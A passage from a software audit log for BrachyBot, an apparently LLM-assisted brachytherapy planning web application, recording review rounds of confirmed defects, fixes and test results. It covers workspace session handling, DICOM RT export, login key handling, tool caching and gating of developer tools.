  are percentages and are not consumed by the CTV training feedback path.
  The prior helper therefore did not double-divide the current CTV values.
  However, inferring units from magnitude was unsafe for future persisted
  payloads. All CTV metric writers now persist
  `volume_metric_units: "fraction"`; training advice reads that declaration
  and retains the old heuristic only for legacy records without the field.

- **F1, 45-second screenshot throttle: confirmed.** A manual dose
  recomputation is an explicit training checkpoint, and the generic throttle
  could silently suppress its dose/DVH screenshot. `manual.dose`,
  `dose-overview`, and `dvh` checkpoints now bypass the generic chatter
  throttle. Needle and other lower-value events remain throttled to prevent
  redundant captures.

- **F3, duplicated final advice report: confirmed and fixed.** The frontend
  rendered the server's summary, which already contained strengths/issues/
  recommendations, and then rendered the same structured advice again. The
  monitor stop response now renders the server summary once, with structured
  advice only as a compatibility fallback.

- **F4, monitor timers crossing runs/sessions: confirmed and fixed.**
  `lastFeedbackAt` and `lastScreenshotAt` are transient UI throttles, not case
  state. They now reset at monitor start and stop, and when the selected case
  changes, so one run cannot suppress the first feedback in another run.

- **Training lifecycle event counted as user planning activity: confirmed and
  fixed.** `training.start` remains in the global UI audit log but is excluded
  from the active training action list and its final activity counts. The stop
  route also no longer falls back from an empty training-event list to the
  global event list, which prevents pre-training events from reappearing in a
  zero-action training report.

- **B5, `question || description`: not a defect.** Current server payloads use
  `question`, but `description` is a deliberate backward-compatible fallback
  for older screenshot/tool payloads. An English comment now documents this
  choice so a later review does not mistake compatibility code for dead code.

- **Authentication/API-key observation: intentional design, no removal.**
  `/api/auth/*` is deliberately protected by the deployment-level
  `BRACHYBOT_API_KEY` before user registration/login. The API key protects
  network access; the HttpOnly session cookie identifies the account. The
  browser can supply the deployment key through `?api_key=...` or the existing
  local configuration mechanism. Removing the guard would turn open
  registration into an unauthenticated network endpoint. An English comment
  was added at the registration route to preserve this design rationale.

### Verification

- Focused training-monitor and review regressions: **75 passed**.
- Full local suite: **161 passed, 1 skipped, 3 warnings**.
- `py_compile` passed for server support, training routes, auth, and planning
  pipeline modules.
- Node `--check` passed for the modified training-monitor and manual-planning
  scripts.
- `git diff --check` passed. No live patient/GPU case was run in this audit;
  deployment still requires restarting the server and performing the normal
  visual training-monitor smoke test.

## Round 30 durable-session UI regression (2026-07-18)

### Confirmed findings

- **Session lifecycle split-brain was real.** `brachybot-chat-core.js`
  declared top-level `loadSessions` and `saveSessions` functions for the old
  browser-local transcript. `brachybot-workspace.js` later assigned
  `window.loadSessions` and `window.saveSessions`, but direct calls from the
  original script continued to use the old global bindings. The result was a
  server-restored viewer paired with a localStorage session list/transcript;
  chat history disappeared after reload and chat requests could carry a stale
  browser session identifier.
- **The deletion popup regression was real.** The durable workspace delete and
  permanent-delete handlers still called the browser-native `window.confirm`,
  bypassing the application's existing localized confirmation modal.
- **A stuck chat turn blocked case navigation.** New/switch/delete returned
  silently while a streaming turn was active. This made a delayed or failed
  response look like New and the session list were non-functional.
- **Chat restore was incomplete at the presentation boundary.** The snapshot
  data was assigned to the in-memory session but the chat renderer was not
  guaranteed to redraw at that point, and a persisted pending flag could
  resurrect a stale spinner after reload.

### Corrective changes

- Added an explicit durable-workspace readiness flag and compatibility shims
  so legacy direct calls route to server session loading and workspace saves.
  Main initialization now calls `window.loadSessions` explicitly, ensuring it
  cannot accidentally read localStorage.
- Every chat transcript mutation schedules a durable workspace checkpoint.
  Applying a workspace snapshot restores and redraws the selected transcript;
  transient `pending` state is cleared so an old Thinking indicator cannot be
  resurrected.
- Session navigation now cancels the active chat turn through the same abort
  path as the Stop control before changing the selected case. Late SSE events
  therefore cannot write into the next workspace. Queued hidden screenshot
  follow-ups are discarded during the same transition, so a visual-analysis
  request from the old case cannot start in the new one.
- Session deletion and recycle-bin purge now use the existing localized
  in-app confirmation modal. If that UI module is unavailable, the operation
  fails closed instead of showing a browser-native dialog.
- Bumped frontend cache versions for the changed scripts and added static
  regression checks covering boot routing, transcript persistence, custom
  confirmation, cancellation, and post-restore chat redraw.

### Verification

- Node syntax checks passed for all four changed JavaScript modules.
- Python bytecode compilation passed for the web package; the local pytest
  executable was unavailable because the desktop environment has an invalid
  global `PYTHONHOME`, so the full pytest suite must be run in the project
  environment before deployment.
- `git diff --check` passed. A browser smoke test must verify: delete modal,
  New case, switching between two cases, restored transcript, and sending a
  short message after switching. The server should be restarted before that
  smoke test so the browser receives the new script cache versions.

### Remote verification update

- On the remote `brachytherapy` environment, the complete pytest suite finished
  with **164 passed, 2 failed, 17 warnings**.
- The new durable-session frontend regression test, workspace/auth/store tests,
  and the other reviewed regression tests passed. The two failures are the
  pre-existing DICOM RT export checks in
  `tests/test_review_round6_regressions.py`:
  `test_dicom_rt_export_writes_linked_objects_on_one_grid` does not emit the
  expected `RTDoseStorage` object, and
  `test_dicom_rt_export_rejects_mixed_geometry` accepts a mismatched dose grid.
  They are outside the session UI change and were intentionally not altered in
  this round.
- Remote Python compilation, JavaScript syntax checks, and `git diff --check`
  passed. The remote worktree is clean and matches commit `1d0c7d0`.

## Round 31 product-agent runtime contracts (2026-07-19)

### Scope and reference review

This round compared BrachyBot's existing architecture with the public design
patterns in [xAI Grok Build](https://github.com/xai-org/grok-build) and
[OpenCode](https://github.com/anomalyco/opencode): bounded context compaction,
explicit session/run state, durable event history, tool contracts, and
idempotency for safe reads. The goal was to adopt their operational discipline,
not to transplant a coding-agent execution model into clinical planning.

### Confirmed improvements

| Area | Confirmed issue or limitation | Corrective implementation |
|---|---|---|
| Context growth | Existing smart memory selected relevant history, but provider requests did not have a single portable hard budget and could retain verbose historical tool output. | Added `ContextPackBuilder`: preserves system/current multimodal intent, keeps a recent bounded tail, turns historical tool protocol messages into ordinary evidence, and stores a compact manifest. |
| Provider compatibility | Native provider compaction tokens are opaque and cannot safely survive a switch between Anthropic-compatible, OpenAI-compatible, and local endpoints. | Deliberately rejected opaque provider state. Workspace snapshots persist JSON-only manifests and can be restored across providers. |
| Tool accuracy | Normal tool calls had a shared execution path, but forced external search bypassed it, and there was no common schema/journal boundary. | Added `ToolCallGateway`; all normal and forced-search calls now pass declared-field validation and lifecycle journaling. Only query-style tools may reuse an idempotent result within the same workspace revision. |
| Turn recovery | Workspace checkpoints retained case data, but no compact canonical record distinguished an interrupted LLM/tool turn from a completed one. | Added `RunLedger` with explicit states. Cancellation and missing required input are recorded; active persisted work is archived as `interrupted`, while an explicit clarification remains `awaiting_input`, and no job is resumed automatically. |
| UI observability | `/api/status` exposed workspace recovery but not the current runtime state. | Added JSON-safe runtime lifecycle history to `/api/status`, without exposing raw arrays, credentials, or provider request payloads. |

### Deliberate boundaries

- No recursive autonomous subagents, arbitrary plugin loading, shell/worktree
  execution, or code-agent task delegation was introduced into the clinical
  execution path. These are reasonable coding-agent techniques but are not a
  safe default for a case workspace.
- Tool schemas are validated conservatively. Existing server-injected image and
  callback parameters remain accepted for backward compatibility; an
  unreviewed strict unknown-field ban would break validated clinical tools.
- Context packing occurs before the first provider call only. Repacking
  function-call/result pairs mid-loop could violate provider protocol ordering,
  so the bounded tool loop itself remains the guard for follow-up messages.

### Verification status

- Python bytecode compilation passed for the changed runtime, workspace, route,
  and facade modules.
- A standalone runtime smoke test passed: required-parameter clarification,
  read-only idempotent reuse, multimodal current-message preservation,
  historical tool-evidence conversion, and interrupted-run restoration.
- Added `tests/test_runtime_contracts.py` for the same regression cases. The
  local desktop Python environment lacks the project dependencies/pytest; the
  remote `brachytherapy` environment ran the new contracts plus existing
  workspace/auth/state coverage successfully: **19 passed, 3 warnings**.
- The complete remote suite at the time finished with **168 passed, 2 failed,
  17 warnings**. The failures were later traced to an ignored DICOM RT exporter
  source file and are resolved in Round 33.

## Round 32 UI motion and dialog-state audit (2026-07-19)

### Verified issue

The responsive stylesheet correctly respected `prefers-reduced-motion` by
limiting animations to one iteration, but a later report stylesheet attempted
to restore a 2.4-second active-task animation. Cascade order produced a single
breathing cycle for an otherwise active task, visually resembling a stalled
pipeline. This was a real UI state-reporting defect, not merely a cosmetic
preference.

### Correction

- The reduced-motion cascade now uses a static active treatment everywhere;
  it never re-enables a partial animation cycle.
- In the normal motion path, Todo rows retain their `active` class and a
  subtle infinite pulse until their own done/error/cancel terminal transition.
  Existing cleanup clears elapsed timers, GPU polling, animation guards, and
  transitional classes on every terminal path.
- Report dialogs now use semantic dialog markup, focus restoration, Tab focus
  containment, Escape/backdrop dismissal, and short opacity/scale transitions.
  A defensive `matchMedia` guard keeps this path safe in limited web views.
- Static regression tests verify that no later stylesheet reintroduces the
  one-cycle rule and that the report modal keeps its keyboard close path.
- The remote `brachytherapy` regression slice covering runtime contracts,
  workspace persistence/authentication/state, and frontend workspace checks
  passed: **25 passed, 3 environment warnings**. JavaScript syntax checks
  passed locally with the bundled Node runtime; the remote host does not
  install Node.
- The subsequent complete remote suite passed **170 tests**. Two unchanged
  DICOM RT export regressions remain documented separately: missing RT Dose
  output and acceptance of a mixed dose grid. The obsolete Round 9 test that
  demanded infinite animation under a user-selected reduced-motion preference
  was corrected to test the intended static active treatment instead.

### Deliberate UX boundary

No layout, font-size, or content position is animated for a live Todo row.
Long clinical traces must remain stable to scan; animation is limited to
opacity, shadow, and a fixed-footprint status dot. This preserves the visual
indication of active work without causing rows or surrounding content to jump.

## Round 33 DICOM RT export release integrity (2026-07-19)

### Verified cause

The active DICOM RT exporter on the RTX host was an older untracked source
file that emitted only RT Structure Set and RT Dose objects. The repository's
`.gitignore` used an unanchored `output/` rule, which silently excluded
`tool_factory/output/dicom_rt_exporter.py` from Git. Consequently, the
repository could contain regression tests for linked RT Structure Set, RT
Plan, and RT Dose export without shipping the implementation that satisfies
them. The old exporter also accepted a dose array with a shape different from
the CT planning grid.

### Correction

- Anchored the ignored runtime output directory to `/output/`, so source
  packages whose directory happens to be named `output` are no longer
  suppressed from release tracking.
- Added the maintained linked exporter to version control. It validates every
  structure and dose shape against the CT ZYX grid before any file is written,
  requires at least one normalized seed channel, writes unapproved RTSTRUCT,
  RTPLAN, and RTDOSE objects, and links their SOP instance UIDs.
- RTDOSE uses unsigned 16-bit pixels with `DoseGridScaling`, preserving the
  physical maximum while avoiding non-interoperable float pixel payloads.

This exporter remains explicitly **UNAPPROVED** and does not claim to replace
a treatment-planning system or clinical sign-off.

The obsolete untracked `dose_exporter.py` and `report_generator.py` duplicates
from an earlier RTX deployment were removed after confirming that no registry,
import, or supported workflow referenced them. The supported implementations
live in `tool_factory/dose_engine` and `tool_factory/report_generator`.
Generated export reports remain ignored under `tool_factory/output/reports/`.

### Verification

- The two previously failing DICOM RT regressions pass: linked RTSTRUCT /
  RTPLAN / RTDOSE object generation and mixed planning-grid rejection.
- The complete remote `brachytherapy` suite passes; remaining warnings are
  SimpleITK SWIG type deprecations emitted during import, not exporter
  behavior.

## Round 34 protected-login usability and credential scope (2026-07-19)

### Confirmed finding

The deployment-level `BRACHYBOT_API_KEY` boundary was intentionally retained
for network-exposed instances. However, the browser login screen had no
discoverable way to provide that key. A protected instance consequently showed
only `Invalid or missing API key` when a user tried to register or sign in,
even though account registration itself was otherwise available. This was a
real usability failure, not a reason to remove the perimeter guard.

### Corrective changes

- Added a collapsed **Deployment access key** field to the account screen.
  A 401 API-key response opens the field and explains why it is required.
- New browser-provided keys now use `sessionStorage` instead of creating a
  durable `localStorage` copy. The request wrapper retains a read-only legacy
  fallback so existing configured browsers continue to work.
- The key remains excluded from workspace snapshots and never enters case
  state, reports, chat context, or agent prompts.

- Replaced the remaining browser-native confirmation prompts in report reset
  and snapshot restore flows with the existing in-app confirmation dialog.
  Report restoration now keeps its snapshot list open when the user cancels.

### Verification

- Added a frontend regression test for the protected-login input path and
  session-scoped credential storage.
- Added a frontend regression preventing report actions from regressing to
  browser-native confirmation dialogs.
- Local Node.js syntax checks pass for all changed browser modules.
- The complete remote `brachytherapy` suite passes: **174 passed, 3
  environment warnings**. The warnings are SimpleITK SWIG type deprecations
  emitted during import, not authentication or report behavior.

## Round 35 public-project scope lock and confirmation consistency (2026-07-19)

### Confirmed finding

The runtime already had the correct external-project scope lock: named public
projects and short follow-ups such as "its code" are forced through public web
tools and filtered away from local filesystem, shell, and code-execution
tools. The earlier DeepRare incident therefore required regression protection,
not a second routing implementation. Separately, old compatibility actions
could still fall back to browser-native confirmation dialogs when reached
outside the durable workspace bridge. Those dialogs were visually inconsistent
with the authenticated workspace and could block embedded-browser use.

### Corrective changes

- Added executable regression coverage for a DeepRare-style pronoun follow-up
  and for the explicit BrachyBot-local-code exemption.
- Replaced the remaining `window.confirm` fallbacks in legacy browser-cache,
  chat-history, and compatibility-session paths with the existing in-app
  confirmation dialog. If that dialog is unavailable, the action fails closed.
- Clarified the browser-cache action: it removes only legacy browser display
  caches and preserves CT, plan, and durable server workspace data.

### Verification

- Added focused Python and static frontend regression tests.
- Local JavaScript syntax checks pass.
- Remote `brachytherapy` verification passes: **177 passed, 3 environment
  warnings**. The warnings are SimpleITK SWIG type deprecations during import.

## Round 36 cancelled-worker trace isolation (2026-07-19)

### Confirmed finding

The streaming runtime used an Agent-wide callback buffer for progress and
planning-substep events. After cancellation, a long-running GPU worker can
finish naturally while the user starts a new turn. Its callbacks could then
append to the shared buffer and appear in the new turn's Execution Trace.
This was a real asynchronous UI-integrity risk; it did not change the planned
geometry itself, but it could show stale progress and mislead the user.

### Corrective changes

- Replaced the Agent-wide callback list with a lock-protected buffer local to
  each streaming tool invocation.
- Bound callback delivery to the captured turn cancellation token. A cancelled
  or superseded worker now drops both progress and substep updates before it
  can mutate the current trace.
- Retained the existing safe limitation: Python does not forcibly terminate an
  in-flight GPU thread. The worker may finish in the background, but it can no
  longer emit trace events into a later user action.

### Verification

- Added a regression guard that prevents reintroducing Agent-wide callback
  buffering and requires turn-local cancellation gating.
- Remote `brachytherapy` bytecode compilation and full verification pass:
  **178 passed, 3 environment warnings**. The warnings are SimpleITK SWIG
  type deprecations during import.

## Round 37 live UI tool freshness (2026-07-19)

### Confirmed finding

The tool gateway cached `ui_inspector`, `viewer_command`, and `query_metrics`
alongside immutable knowledge tools. Their cache key can include a workspace
revision, but older UI snapshots do not reliably supply that revision. A
repeated UI query could therefore return stale viewer, slice, or dose metrics
after a user interaction. This contradicted BrachyBot's requirement to act on
the current visible case state.

### Corrective changes

- Restricted gateway caching to case-independent `clinical_kb` retrieval.
- Live browser, patient metric, model-availability, and viewer-command tools
  now execute on every request and observe current state.
- Added regression coverage that invokes `ui_inspector` twice and proves that
  the second result is not reused.

### Verification

- Remote `brachytherapy` verification passes: **179 passed, 3 environment
  warnings**. The warnings are SimpleITK SWIG type deprecations during import.

## Round 38 durable-workspace release audit (2026-07-19)

### Scope and result

Performed a final source-level trace across the authenticated case-session
boundary, artifact download path, session-switch restoration flow, editor
lease propagation, cancellation ledger, and tool-call freshness policy. No
additional behavior-changing defect was verified in these paths.

### Verified invariants

- Case artifact URLs are constructed only from sanitized relative paths and
  resolve through the authenticated owner-scoped session artifact route. Direct
  exporters and browser-generated artifacts both write below the selected
  workspace's `artifacts/` directory.
- A session transition persists the outgoing workspace, releases its editor
  lease, clears browser-resident case data, changes the server-selected case,
  then hydrates CT, labels, planning state, report, chat, viewer settings, and
  saved camera state in that order. The restore path checks that the selected
  session has not changed before applying asynchronous results.
- Browser fetch wrappers compose deliberately: the earlier API wrapper adds a
  deployment key and selected-case header, while the authentication wrapper
  adds cookie credentials, CSRF protection, and the per-browser editor token.
  Lease release therefore remains CSRF-protected even though its local call
  site contains only a JSON content-type header.
- Dynamic tools are not idempotency-cached. Only immutable clinical knowledge
  retrieval remains cacheable, so UI inspection, viewer state, and current
  metrics are evaluated against the live case.
- Run ledger restores never revive a running provider or GPU task. A persisted
  clarification state is retained as awaiting input; all other live work is
  recorded as interrupted and requires an explicit user rerun.

### Verification

- Parsed all 14 first-party browser JavaScript modules with Node.js syntax
  checks (vendor bundles excluded).
- Ran the complete remote `brachytherapy` test suite on the deployed source:
  **179 passed, 3 environment warnings**. The warnings are SimpleITK SWIG type
  deprecations during import and do not represent test failures.

### Deliberate compatibility boundary

The legacy localStorage functions remain as guarded compatibility shims for
pre-workspace installations and one-time import. Once
`__serverWorkspaceReady` is set, they delegate to the server-backed workspace
and no longer write a competing clinical session store. Removing those shims
would break cached older browser assets without improving the authenticated
runtime.

## Round 39 durable chat-driven case rename (2026-07-19)

### Confirmed finding

The `session.rename` UI-controller action updated only the browser-side session
title and scheduled a UI snapshot save. Durable case titles live in the
owner-scoped session metadata repository, not in the browser snapshot. A
rename requested through chat therefore looked successful until the page was
refreshed or the user signed in again, at which point the server list restored
the previous title.

### Corrective changes

- Routed chat-driven case renames through the existing authenticated
  `PATCH /api/sessions/<id>` bridge used by the manual session UI.
- Reject an empty title or an unavailable durable-workspace bridge instead of
  silently applying a non-persistent local edit.
- Keep the in-memory list synchronized only after the server-side rename has
  succeeded, and surface a structured error if it fails.

### Verification

- Added a Flask integration test proving an authenticated rename is visible in
  a fresh server session listing.
- Added a frontend regression test requiring the UI-controller action to call
  the durable rename bridge.
- Parsed the changed browser module with Node.js syntax checking.
- Remote `brachytherapy` full verification passes: **181 passed, 3 environment
  warnings**. The warnings are SimpleITK SWIG type deprecations during import.

## Round 40 lease-safe manual case rename (2026-07-19)

### Confirmed finding

The sidebar's manual rename handler changed its in-memory title before asking
the durable session API to save it. If a second browser held the edit lease,
the API correctly rejected the write, but the first browser continued to show
the unsaved title. This was a UI-state integrity defect rather than a metadata
or authorization bypass.

### Corrective changes

- The durable path now waits for server confirmation before the sidebar and
  chat header display the new title.
- On a rejected write, it restores the previously confirmed title and redraws
  the session list. The legacy localStorage compatibility path retains its
  local-only update because it has no server repository to confirm.

### Verification

- Added a frontend regression test that requires durable confirmation to
  precede the local title assignment and requires rollback handling.
- Parsed the changed browser module with Node.js syntax checking.
- Remote `brachytherapy` full verification passes: **182 passed, 3 environment
  warnings**. The warnings are SimpleITK SWIG type deprecations during import.

## Round 41 transcript-preserving chat restore (2026-07-19)

### Confirmed finding

The chat restore renderer used a set keyed only by message text across the
entire stored transcript. It hid every later occurrence of the same text,
even when a user intentionally repeated a question later in the case or the
assistant gave a legitimate repeated short answer. This could make a durable
session appear to have lost chat history after a refresh.

### Corrective changes

- Retained removal of transient `Send failed` rows.
- Replaced global text de-duplication with adjacent duplicate suppression after
  those transient rows are removed.
- Treat legacy `bot-response` and rendered `bot` records as the same message
  type only for this adjacent historical-repair check. Non-adjacent messages
  are now always retained.

### Verification

- Added a frontend regression check requiring adjacent-only comparison rather
  than a transcript-wide `seen` set.
- Parsed the changed browser module with Node.js syntax checking.
- Remote `brachytherapy` full verification passes: **183 passed, 3 environment
  warnings**. The warnings are SimpleITK SWIG type deprecations during import.

## Round 42 cancellation acknowledgement before case switch (2026-07-19)

### Confirmed finding

Switching cases requests cancellation of the current chat turn, but the
browser previously fired `/api/chat/abort` without waiting for its response.
The session switch could immediately update the signed server session cookie.
That ordering relied on browser request timing to make the abort target the
old case and was not a safe workspace isolation guarantee.

### Corrective changes

- Keep the local stop animation and fetch abort immediate.
- Await the server cancellation acknowledgement before `sendChat()` resolves;
  session switching already awaits this function before selecting another case.
- Preserve an offline fallback: an abort transport failure does not resurrect
  progress UI, and the turn-level cancellation token continues to suppress
  late client events.

### Verification

- Added a frontend regression check requiring the awaited abort request in the
  active-turn stop path.
- Parsed the changed browser module with Node.js syntax checking.
- Remote `brachytherapy` full verification passes: **184 passed, 3 environment
  warnings**. The warnings are SimpleITK SWIG type deprecations during import.

## Round 43 durable session-controller completion semantics (2026-07-19)

### Confirmed findings

The declarative UI controller invoked asynchronous new-case, case-switch, and
case-delete functions without returning their promises. The execution trace
could mark a session action complete while the authenticated workspace was
still saving, restoring, or acquiring its edit lease; a following agent tool
could therefore observe the wrong case. In addition, the legacy
`session.clear_all` catalog entry claimed it deleted all sessions even though
its implementation has always cleared browser-only compatibility caches.

### Corrective changes

- Return durable session-operation promises from the browser UI action
  dispatcher so progress and follow-up tool calls wait for the completed case
  transition.
- Make new, switch, and delete operations return structured success, error,
  cancellation, and selected-case results.
- Add the accurately named `browser_cache.clear` action. Keep
  `session.clear_all` only as a documented compatibility alias, with both the
  tool catalog and confirmation dialog stating that durable server cases are
  retained.

### Verification

- Added frontend regression checks for awaited session transitions and honest
  cache-clearing semantics.
- Parsed all changed browser modules with Node.js syntax checking.
- Remote `brachytherapy` full verification passes: **186 passed, 3 environment
  warnings**. The warnings are SimpleITK SWIG type deprecations during import.

## Round 44 UI action completion and failure propagation (2026-07-19)

### Confirmed finding

Several non-session actions in the same UI-controller dispatcher launched
asynchronous viewer, training, planning, reset, or chat-history work without
returning the underlying promise. The trace could therefore report success
before dose-peak navigation or 3D reconstruction finished, and manual
planning functions swallowed HTTP failures before the controller could report
them. In particular, a rejected planning reset could clear only the browser
while the server-side plan remained intact.

### Corrective changes

- Return and await dose-peak navigation, batch OAR reconstruction, training,
  readiness, report, chat-history, and reset operations through the common UI
  action executor.
- Make the manual full pipeline, individual pipeline steps, and CTV/OAR
  segmentation return structured success or failure results after their UI
  refresh completes.
- Treat a non-success planning-reset response as a real failure and retain the
  visible plan rather than clearing the browser into a divergent state.

### Verification

- Added regression checks covering promise-returning viewer/manual-plan
  controller branches and structured manual planning results.
- Parsed the changed browser modules with Node.js syntax checking.
- Remote `brachytherapy` full verification passes: **187 passed, 3 environment
  warnings**. The warnings are SimpleITK SWIG type deprecations during import.

## Round 45 workspace-scoped multimodal screenshots (2026-07-19)

### Confirmed finding

The workspace migration correctly changed browser screenshot persistence to
`/api/sessions/<case>/screenshots/<file>`, but the LLM multimodal loader still
recognized only the retired shared `/api/screenshots/<file>` URL and read only
from `uploads/screenshots`. Consequently, a screenshot could appear in chat
while the analysis follow-up received no image and could only respond that the
visual context was unavailable.

### Corrective changes

- Bind each hydrated web agent to its authenticated workspace root and case ID.
- Accept both the legacy URL and the durable case-scoped URL, while resolving a
  case-scoped image only from the current workspace's `screenshots` directory.
- Reject a screenshot URL whose case ID does not match the active agent case;
  this prevents cross-case image access through prompt text.
- Retain legacy screenshot loading for standalone/CLI deployments that do not
  create durable web workspaces.

### Verification

- Added a regression test for workspace image loading and cross-case rejection.
- Executed a remote `brachytherapy` smoke test using real workspace layout:
  the current-case PNG produced an OpenAI-compatible image block and a second
  case ID was rejected.

## Round 46 deterministic test imports (2026-07-19)

### Confirmed finding

Running tests from the deployed `/home/lht/snap/brachyplan/BrachyBot` tree
could still load the unrelated parent `/home/lht/snap/brachyplan/config.py`
under the top-level name `config`. It shadowed BrachyBot's `config/` package
during pytest collection, so a valid checkout could report unrelated import
errors before any functional test ran.

### Corrective changes

- Make the pytest bootstrap explicitly import BrachyBot's own `config` package
  after placing the repository root first on `sys.path`.
- Evict only an already-loaded external flat `config` module. This is confined
  to the test harness and deliberately leaves production import behavior
  unchanged.

### Verification

- Remote targeted regression suite: **73 passed, 3 environment warnings**.
- Remote full suite: **188 passed, 3 environment warnings**. The warnings are
  SimpleITK SWIG type deprecations during import.

## Round 47 hard-obstacle mesh fidelity (2026-07-19)

### Confirmed finding

The trajectory pipeline correctly applies the Data Tree's non-traversable
policy in planning-grid and original-world validation. A deployed workspace
was independently checked: all four published needle segments were clear of
the raw CTV/OAR hard-label masks. However, `/api/viewer/3d_mask` then applied
dilation, closing, hole filling, and Laplacian smoothing to every displayed
label. For thin or sparse bones and vessels, that cosmetic processing can make
the rendered surface substantially larger than the physical mask used for
planning, falsely suggesting that a safe needle crosses an obstacle.

### Corrective changes

- Resolve the current Data Tree hard-obstacle policy in the 3D mesh route.
- Render non-traversable OAR labels and the pancreatic CTV artery/vein labels
  with a label-faithful mesh: no boundary-changing morphology or vertex
  smoothing.
- Keep the existing presentation smoothing for ordinary, traversable anatomy.
  This limits the visual change to structures whose displayed boundary must
  agree with the planning safety contract.
- Include mesh geometry mode in the cache key and response so a previously
  smoothed mesh cannot be reused as a hard-obstacle mesh.

### Verification

- Added regression coverage for Data Tree hard labels, traversable soft
  structures, and CTV embedded vessels.
- Remote `brachytherapy` safety suite: **14 passed, 3 environment warnings**.
  Warnings are the existing SimpleITK SWIG type deprecations during import.

## Round 48 atomic case transitions (2026-07-19)

### Confirmed finding

The durable-workspace bridge correctly persisted and restored case snapshots,
but `newChat`, `switchSession`, and `deleteSession` were independent async
flows. A user could initiate a second sidebar action while the first request
was still waiting for persistence, lease release, server selection, and viewer
restore. Since each flow clears and restores browser state, an older response
could finish last and paint a previous case's chat or viewer state over the
newly selected case. This is a genuine race condition, especially on a remote
GPU workstation or an intermittent network.

### Corrective changes

- Serialize create, switch, and delete through one workspace-transition gate.
- Cancel any deferred browser snapshot write before a transition starts, then
  await the explicit current-case checkpoint before changing server selection.
- Mark the sidebar busy and disable repeat case actions for the short atomic
  transition; always release that state on success, cancellation, or failure.
- Convert unhandled lifecycle exceptions into structured results while logging
  the technical error. On a failed mid-transition request, reload the current
  server-selected workspace before restoring interaction, so one failed
  request cannot leave the sidebar permanently non-interactive or the chat and
  viewer pointed at different cases.

### Verification

- Added source-level regression coverage for the serialization gate, deferred
  save cancellation, lifecycle wrapping, and busy sidebar state.
- Added a Node.js runtime harness that holds a case-create request open,
  verifies the second click is rejected as busy, and confirms the first
  transition restores the selected session and releases the busy state. The
  harness is skipped only on deployments without Node.js.
- Node.js syntax check passes for the workspace bridge.
- Remote `brachytherapy` workspace frontend suite: **16 passed**.

## Round 49 dynamic developer-tool availability (2026-07-19)

### Confirmed finding

`code_executor`, `shell_executor`, `env_manager`, and `tool_creator` checked
their trusted-local environment gates only after the LLM had already received
their function schemas. In a normal clinical deployment the model could choose
one of those disabled tools, wait for a failed call, and then make a second
attempt. This caused avoidable latency and misleading execution traces; it
also explained requests that tried a disabled code executor for a UI task.

### Corrective changes

- Add a dynamic `BaseTool.is_available()` capability hook and make the tool
  registry omit unavailable tools from LLM schemas, textual tool descriptions,
  and rule-based help listings.
- Make all four explicitly gated developer tools report their environment
  state through that hook.
- Keep the original execution-time gates as defense in depth, and retain full
  code/tool/environment/shell capability whenever the corresponding explicit
  `BRACHYBOT_ENABLE_*` environment variable is set.
- Make the direct CT-analysis shortcut honor the same code-executor gate.

### Verification

- Added unit coverage for disabled-tool omission, explicit opt-in visibility,
  and direct-analysis gating.

## Round 50 RL final-plan ranking and coverage propagation (2026-07-19)

### Confirmed finding

The interactive RL path had finite episode, action, and wall-clock controls;
the deployed configuration is `100` episodes, `24` actions per episode, and a
`180` second RL budget. Therefore the reported long runtime was not an
unbounded loop. The cost is dominated by legitimate AI dose evaluations over
the configured candidate/action space, with an optional deterministic
rule-based fallback executed after an RL plan remains below the requested
coverage.

A separate correctness defect was confirmed. The high-level and low-level
selection code compared `low_agent.rewards[-1]`, the *last seed's incremental
reward*, against the best complete plan. In addition, the high-level
environment discarded the coverage returned for its initial seed. A complete
plan can therefore be superior while its final seed has a smaller marginal
reward, and a valid one-seed plan could be misreported as zero coverage. Both
conditions can lead to unnecessary iterations and an incorrect fallback.

### Corrective changes

- Keep the initial high-level seed's coverage in `HighLevelEnv.step`.
- Add a final-plan objective that accumulates the stored AI dose maps and
  computes coverage plus the existing OAR penalty on that complete dose.
- Use that final objective consistently when retaining hierarchical,
  low-level, and flat RL candidates; incremental rewards remain exclusively
  for policy updates.
- Retain the existing configured execution limits and dose model; this fix
  does not alter the coordinate chain, obstacle filtering, or the trained
  model contract.

### Verification

- Added a regression test where two seed dose maps jointly cover the target;
  the test proves final-plan ranking uses accumulated dose rather than the
  last seed.
- Local RL guard and dose-inference suite: **8 passed, 2 skipped, 3 existing
  SimpleITK import warnings**.

## Round 51 non-blocking viewer failure feedback (2026-07-19)

### Confirmed finding

Three interactive paths still used browser-native `alert()` dialogs: failed
dose-surface mapping, invalid colorbar limits, and upload failure. Native
dialogs block the browser event loop; in this application that can make a
WebGL camera/needle gesture or an asynchronous upload appear frozen and is
visually inconsistent with the existing custom confirmation/modal system.

### Corrective changes

- Add one accessible, dismissible application-notice surface with automatic
fade-out and a reduced-motion fallback.
- Route the three verified viewer/upload failures through that surface while
keeping their original failure recovery and console diagnostics intact.
- Version the changed CSS and JavaScript resources in `index.html` so a
remote browser does not retain the former native-dialog code from cache.

### Verification

- Added a frontend regression test that rejects native alerts in all three
  interactive modules and requires the shared notice surface.
- Local workspace/auth frontend suite: **28 passed, 3 existing SimpleITK
  import warnings**.
- Node.js syntax checks passed for all modified browser scripts.

## Round 53 offline-safe session and chat recovery (2026-07-19)

### Confirmed findings

The reported post-refresh state had two independent causes. First, the
remote workstation had no `web/server.py`, gunicorn, or listener on the
configured HTTP port at the time of inspection. The browser therefore showed
`Offline`; the fallback client state retained the placeholder session id
`web`, so it could not load the authenticated server-owned session list or
workspace snapshot. This is an environment/deployment failure, not evidence
that the SQLite case data was lost.

Second, the browser bridge used unbounded network waits for session list,
workspace snapshot, case transitions, lease release, and chat streaming. A
server restart or half-open TCP connection could consequently leave the
sidebar in a busy/read-only-looking state and leave the assistant's Thinking
indicator visible forever. This was a genuine frontend liveness defect.

### Corrective changes

- Add bounded `AbortController` requests for authentication, lease release,
  session/workspace operations, and recovery. A failed transition always
  releases `aria-busy` and the `workspace-transitioning` lock.
- Bound SSE connection setup to 30 seconds and idle event reads to 90 seconds.
  An idle stream now aborts the underlying chat request as well as ending the
  local read, so a stalled UI cannot leave a planning job running silently.
- Make failure recovery generation-aware and invalidate any late recovery
  when the transition finishes. A delayed response cannot repaint an older
  case after the user has received the failure result.
- Make lease release self-contained with session credentials, CSRF, and the
  editor token, while applying its own four-second timeout. This preserves
  case isolation without allowing a dead server to block New/Switch.
- Increment the classic-script cache versions for the changed auth, chat, and
  workspace bridges so a browser refresh actually loads the liveness fix.
- Keep the existing server-owned session model and lease semantics unchanged;
  the client now fails closed and reports a clear operational error when the
  service is unavailable. The server must still be started before use.

### Verification

